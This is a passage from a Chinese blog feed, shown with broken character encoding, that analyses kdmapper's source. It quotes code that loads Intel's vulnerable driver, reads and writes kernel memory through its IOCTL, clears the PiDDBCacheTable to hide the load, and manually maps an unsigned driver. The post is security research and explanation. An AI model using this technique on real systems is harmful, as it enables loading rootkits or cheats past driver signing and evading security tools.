class="string">L&quot;[-] Can&#x27;t use --free and --indPages at the same time&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (passAllocationPtr) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Pass Allocation Ptr as first param enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copyHeader) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] Copying driver header enabled&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="type">bool</span> UpdateOffset = !(<span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;dontUpdateOffsets&quot;</span>) &gt; <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> FilePathParamIdx = <span class="built_in">paramExists</span>(argc, argv, <span class="string">L&quot;offsetsPath&quot;</span>);</span><br><span class="line">std::wstring offsetFilePath = utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\offsets.ini&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (UpdateOffset &amp;&amp; FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[-] Can&#x27;t set --offsetsPath without set --dontUpdateOffsets&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FilePathParamIdx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">offsetFilePath = argv[FilePathParamIdx + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">&quot;[+] Setting Offsets File Path To: &quot;</span> &lt;&lt; offsetFilePath &lt;&lt; std::endl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> drvIndex = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (std::filesystem::<span class="built_in">path</span>(argv[i]).<span class="built_in">extension</span>().<span class="built_in">string</span>().<span class="built_in">compare</span>(<span class="string">&quot;.sys&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">drvIndex = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (drvIndex &lt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">help</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::wstring driver_path = argv[drvIndex];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!std::filesystem::<span class="built_in">exists</span>(driver_path)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] File &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="string">L&quot; doesn&#x27;t exist&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PDB_OFFSETS</span></span><br><span class="line"><span class="keyword">if</span> (!KDSymbolsHandler::<span class="built_in">GetInstance</span>()-&gt;<span class="built_in">ReloadFile</span>(offsetFilePath, UpdateOffset ? utils::<span class="built_in">GetCurrentAppFolder</span>() + <span class="string">L&quot;\\&quot;</span> + SYM_FROM_PDB_EXE : <span class="string">L&quot;&quot;</span>)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Error: Failed To Get Symbols Info.&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::vector&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">ReadFileToMemory</span>(driver_path, &amp;raw_image)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!kdmapper::<span class="built_in">MapDriver</span>(raw_image.<span class="built_in">data</span>(), <span class="number">0</span>, <span class="number">0</span>, free, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Unload</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[+] success&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯æ£€æŸ¥å‚æ•°é‡Œé¢çš„sysç»“å°¾çš„è·¯å¾„ï¼Œå¹¶ä¸”#ifdef PDB_OFFSETSï¼Œæ˜¯å¦å®šä¹‰äº†è¿™ä¸ªï¼Œçœ‹äº†ä¸€åœˆä¹Ÿæ²¡æœ‰å®šä¹‰ï¼Œä¹‹åå†è®¨è®ºè¿™ä¸ªã€‚</p><h3 id="æ¶æ„é©±åŠ¨åŠ è½½"><a href="#æ¶æ„é©±åŠ¨åŠ è½½" class="headerlink" title="æ¶æ„é©±åŠ¨åŠ è½½"></a>æ¶æ„é©±åŠ¨åŠ è½½</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">Load</span>()) &#123;</span><br><span class="line"><span class="built_in">PauseIfParentIsExplorer</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830053448396.png" alt="image-20250830053448396"></p><p>ä¸Šé¢å°±æ˜¯ä¸€äº›ç®€å•çš„æç¤ºï¼Œåˆšå¼€å§‹æ˜¯é©±åŠ¨æ˜¯å¦å·²ç»åŠ è½½ä¸Šï¼Œç„¶åå°±æ˜¯æŸ¥è¯¢TEMPæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”ç»™äº†ä¸€ä¸ªéšæœºçš„åå­—ç”¨äºæ¯æ¬¡ä½¿ç”¨æ­¤ç¨‹åºä¸ä¼šé‡å¤é€ æˆåŠ è½½ä¸ä¸Šé©±åŠ¨çš„æƒ…å†µï¼Œä¸ºä»¥ååˆ›å»ºæœåŠ¡åšå‡†å¤‡ï¼Œä¹‹åé€šè¿‡ä¸‹é¢ä»£ç ï¼ŒæŠŠç¨‹åºå†…ç½®çš„é©±åŠ¨äºŒè¿›åˆ¶ç”Ÿæˆæ–‡ä»¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!utils::<span class="built_in">CreateFileFromMemory</span>(driver_path, <span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(intel_driver_resource::driver), <span class="built_in">sizeof</span>(intel_driver_resource::driver))) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to create vulnerable driver file&quot;</span> &lt;&lt; std::endl);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830054202804.png" alt="image-20250830054202804"></p><h4 id="å¯ç”¨è°ƒè¯•ç‰¹æƒ"><a href="#å¯ç”¨è°ƒè¯•ç‰¹æƒ" class="headerlink" title="å¯ç”¨è°ƒè¯•ç‰¹æƒ"></a>å¯ç”¨è°ƒè¯•ç‰¹æƒ</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">AcquireDebugPrivilege</span>()) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to acquire SeDebugPrivilege&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">_wremove(driver_path.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åŠ è½½é©±åŠ¨"><a href="#åŠ è½½é©±åŠ¨" class="headerlink" title="åŠ è½½é©±åŠ¨"></a>åŠ è½½é©±åŠ¨</h4><pre><code>if (!service::RegisterAndStart(driver_path, GetDriverNameW())) &#123;Log(L&quot;[-] Failed to register and start service for the vulnerable driver&quot; &lt;&lt; std::endl);_wremove(driver_path.c_str());return false;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055348233.png" alt="image-20250830055348233"></p><h4 id="æ‰“å¼€é©±åŠ¨å¥æŸ„"><a href="#æ‰“å¼€é©±åŠ¨å¥æŸ„" class="headerlink" title="æ‰“å¼€é©±åŠ¨å¥æŸ„"></a>æ‰“å¼€é©±åŠ¨å¥æŸ„</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">    <span class="string">L&quot;\\\\.\\Nal&quot;</span>,                <span class="comment">// è®¾å¤‡åç§°</span></span><br><span class="line">    GENERIC_READ | GENERIC_WRITE, <span class="comment">// è®¿é—®æƒé™ï¼ˆè¯»å†™ï¼‰</span></span><br><span class="line">    <span class="number">0</span>,                            <span class="comment">// å…±äº«æ¨¡å¼ï¼ˆä¸å…±äº«ï¼‰</span></span><br><span class="line">    <span class="literal">nullptr</span>,                      <span class="comment">// å®‰å…¨å±æ€§ï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line">    OPEN_EXISTING,                <span class="comment">// æ‰“å¼€æ–¹å¼ï¼ˆå¿…é¡»å·²å­˜åœ¨ï¼‰</span></span><br><span class="line">    FILE_ATTRIBUTE_NORMAL,        <span class="comment">// æ–‡ä»¶å±æ€§ï¼ˆæ™®é€šï¼‰</span></span><br><span class="line">    <span class="literal">NULL</span>                          <span class="comment">// æ¨¡æ¿æ–‡ä»¶ï¼ˆæ— ï¼‰</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055846938.png" alt="image-20250830055846938"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830055828886.png" alt="image-20250830055828886"></p><h4 id="è·å–ntoskrnl-exeçš„åŸºåœ°å€"><a href="#è·å–ntoskrnl-exeçš„åŸºåœ°å€" class="headerlink" title="è·å–ntoskrnl.exeçš„åŸºåœ°å€"></a>è·å–ntoskrnl.exeçš„åŸºåœ°å€</h4><p>è¿™ä¸€æ­¥æ˜¯ä¸æ˜¯ç†Ÿæ‚‰äº†ï¼Œè·Ÿä¸Šç¯‡æ–‡ç« ä¸€æ ·ï¼Œè¦æ‰¾è¿™ä¸ªntoskrnl.exeçš„åŸºåœ°å€ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntoskrnlAddr = utils::<span class="built_in">GetKernelModuleAddress</span>(<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (ntoskrnlAddr == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Failed to get ntoskrnl.exe&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¯»å–ntoskrnl-exe"><a href="#è¯»å–ntoskrnl-exe" class="headerlink" title="è¯»å–ntoskrnl.exe"></a>è¯»å–ntoskrnl.exe</h4><p>è¿™é‡Œçªç„¶è¯»å–ï¼Œè¿˜æ˜¯è‡ªå®šä¹‰çš„è¯»å–å‡½æ•°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ã€‚è·Ÿè¸ªè°ƒç”¨é“¾ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check MZ ntoskrnl.exe</span></span><br><span class="line">IMAGE_DOS_HEADER dosHeader = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!intel_driver::<span class="built_in">ReadMemory</span>(intel_driver::ntoskrnlAddr, &amp;dosHeader, <span class="built_in">sizeof</span>(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line"><span class="built_in">Log</span>(<span class="string">L&quot;[-] Can&#x27;t exploit intel driver, is there any antivirus or anticheat running?&quot;</span> &lt;&lt; std::endl);</span><br><span class="line">intel_driver::<span class="built_in">Unload</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">intel_driver::ReadMemory</span><span class="params">(<span class="type">uint64_t</span> address, <span class="type">void</span>* buffer, <span class="type">uint64_t</span> size)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> MemCopy(reinterpret_cast&lt;<span class="type">uint64_t</span>&gt;(buffer), address, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">intel_driver::MemCopy</span><span class="params">(<span class="type">uint64_t</span> destination, <span class="type">uint64_t</span> source, <span class="type">uint64_t</span> size)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!destination || !source || !size)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">COPY_MEMORY_BUFFER_INFO copy_memory_buffer = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">copy_memory_buffer.case_number = <span class="number">0x33</span>;</span><br><span class="line">copy_memory_buffer.source = source;</span><br><span class="line">copy_memory_buffer.destination = destination;</span><br><span class="line">copy_memory_buffer.length = size;</span><br><span class="line"></span><br><span class="line">DWORD bytes_returned = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> DeviceIoControl(hDevice, ioctl1, &amp;copy_memory_buffer, <span class="keyword">sizeof</span>(copy_memory_buffer), nullptr, <span class="number">0</span>, &amp;bytes_returned, nullptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°é€šè¿‡é©±åŠ¨é€šä¿¡ï¼ˆIOCTLï¼‰å®ç° <strong>å†…æ ¸åˆ°ç”¨æˆ·æ€çš„å†…å­˜å¤åˆ¶</strong>ã€‚ç„¶åè¿›è¡Œåˆ¤æ–­æ˜¯å¦peæ–‡ä»¶ï¼Œå¦‚æœè¯»å–å¤±è´¥ï¼Œå°±æ˜¯é©±åŠ¨åŠ è½½æœ‰é—®é¢˜ã€‚</p><h4 id="IOCTL"><a href="#IOCTL" class="headerlink" title="IOCTL"></a>IOCTL</h4><p>æ¥ä¸ªå°æ’æ›²ï¼Œé©±åŠ¨é€šä¿¡å†…å­˜å¤åˆ¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constexpr</span> ULONG32 ioctl1 = <span class="number">0x80862007</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl1, &amp;copy_memory_buffer, <span class="built_in">sizeof</span>(copy_memory_buffer), <span class="literal">nullptr</span>, <span class="number">0</span>, &amp;bytes_returned, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061041239.png" alt="image-20250830061041239"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_memory_buffer.case_number = <span class="number">0x33</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061132974.png" alt="image-20250830061132974"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830061149185.png" alt="image-20250830061149185"></p><p><strong>ç”¨æˆ·æ€è°ƒç”¨ <code>DeviceIoControl</code>æ—¶ï¼ŒIRQL å§‹ç»ˆæ˜¯ <code>PASSIVE_LEVEL</code>ï¼ˆ0ï¼‰</strong>ï¼Œå› æ­¤ <strong><code>KeGetCurrentIrql() &lt;= 2</code>çš„éªŒè¯ä¸€å®šä¼šé€šè¿‡</strong></p><h4 id="éšè—é©±åŠ¨åŠ è½½ç—•è¿¹"><a href="#éšè—é©±åŠ¨åŠ è½½ç—•è¿¹" class="headerlink" title="éšè—é©±åŠ¨åŠ è½½ç—•è¿¹"></a>éšè—é©±åŠ¨åŠ è½½ç—•è¿¹</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::ClearPiDDBCacheTable()) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to ClearPiDDBCacheTable&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830062024394.png" alt="image-20250830062024394"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/5f365f67bf41998eae457b0cadb324cb.png" alt="img"></p><h3 id="è¯»å–æ¶æ„é©±åŠ¨æ–‡ä»¶åˆ°å†…å­˜"><a href="#è¯»å–æ¶æ„é©±åŠ¨æ–‡ä»¶åˆ°å†…å­˜" class="headerlink" title="è¯»å–æ¶æ„é©±åŠ¨æ–‡ä»¶åˆ°å†…å­˜"></a>è¯»å–æ¶æ„é©±åŠ¨æ–‡ä»¶åˆ°å†…å­˜</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">uint8_t</span>&gt; raw_image = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (!utils::ReadFileToMemory(driver_path, &amp;raw_image)) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to read image to memory&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å†…å­˜åˆ†é…æ¨¡å¼âˆ™"><a href="#å†…å­˜åˆ†é…æ¨¡å¼âˆ™" class="headerlink" title="å†…å­˜åˆ†é…æ¨¡å¼âˆ™"></a>å†…å­˜åˆ†é…æ¨¡å¼âˆ™</h4><p>AllocationMode::AllocatePool é»˜è®¤æ¨¡å¼ï¼Œä½¿ç”¨å†…æ ¸çš„ åˆ†é¡µå†…å­˜æ± ï¼ˆPaged Poolï¼‰ åˆ†é…è¿ç»­å†…å­˜ã€‚<br>AllocationMode::AllocateIndependentPages å¦‚æœ indPagesModeä¸º trueï¼Œåˆ™æ”¹ç”¨ ç‹¬ç«‹ç‰©ç†é¡µï¼ˆIndependent Pagesï¼‰ åˆ†é…éè¿ç»­å†…å­˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (indPagesMode) &#123;</span><br><span class="line">mode = kdmapper::AllocationMode::AllocateIndependentPages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å†…å­˜åŠ è½½é©±åŠ¨"><a href="#å†…å­˜åŠ è½½é©±åŠ¨" class="headerlink" title="å†…å­˜åŠ è½½é©±åŠ¨"></a>å†…å­˜åŠ è½½é©±åŠ¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS exitCode = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!kdmapper::MapDriver(raw_image.data(), <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">free</span>, !copyHeader, mode, passAllocationPtr, callbackExample, &amp;exitCode)) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Failed to map &quot;</span> &lt;&lt; driver_path &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">intel_driver::Unload();</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250830165818760.png" alt="image-20250830165818760"></p><p>æœ‰ä¸¤ç™¾è¡Œä»£ç ï¼Œç®€å•è¯´å°±æ˜¯æŠŠæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ç„¶åä¿®å¤é‡å®šä½è¡¨ï¼ŒIATè¡¨ï¼Œcookieã€‚ç„¶åè®¾ç½®ä¸€ä¸ªå‡½æ•°å…¥å£ç‚¹ï¼Œè¿›è¡Œè°ƒç”¨ï¼Œå¤§ä½“è·Ÿä¸Šç¯‡å†…å­˜åŠ è½½é©±åŠ¨çš„é€»è¾‘ä¸€æ ·çš„ã€‚</p><h3 id="é©±åŠ¨å¸è½½"><a href="#é©±åŠ¨å¸è½½" class="headerlink" title="é©±åŠ¨å¸è½½"></a>é©±åŠ¨å¸è½½</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!intel_driver::Unload()) &#123;</span><br><span class="line">Log(<span class="string">L&quot;[-] Warning failed to fully unload vulnerable driver &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>);</span><br><span class="line">PauseIfParentIsExplorer();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ã€Šå†…å­˜åŠ è½½é©±åŠ¨ã€‹æ–‡ç« é‡Œé¢ï¼Œæˆ‘ä»¬è¯¦ç»†çœ‹äº†ä¸€ä¸‹å¦‚ä½•ä½¿ç”¨é©±åŠ¨å»å†…å­˜åŠ è½½é©±åŠ¨ï¼Œè½å®åˆ°å®é™…ç§ï¼Œæˆ‘ä»¬éœ€è¦è§£å†³çš„é—®é¢˜è¿˜æ˜¯æ€ä¹ˆä¸BYOVDè”åŠ¨èµ·æ¥ï¼Œè€Œkdm</summary>
      
    
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/categories/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Windows Kernelå®‰å…¨ç ”ç©¶" scheme="https://250wuyifan.github.io/tags/Windows-Kernel%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
  </entry>
  
  <entry>
    <title>å†…å­˜åŠ è½½é©±åŠ¨</title>
    <link href="https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/"/>
    <id>https://250wuyifan.github.io/2025/08/29/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/</id>
    <published>2025-08-29T15:27:51.000Z</published>
    <updated>2025-08-29T20:41:56.000Z</updated>
    
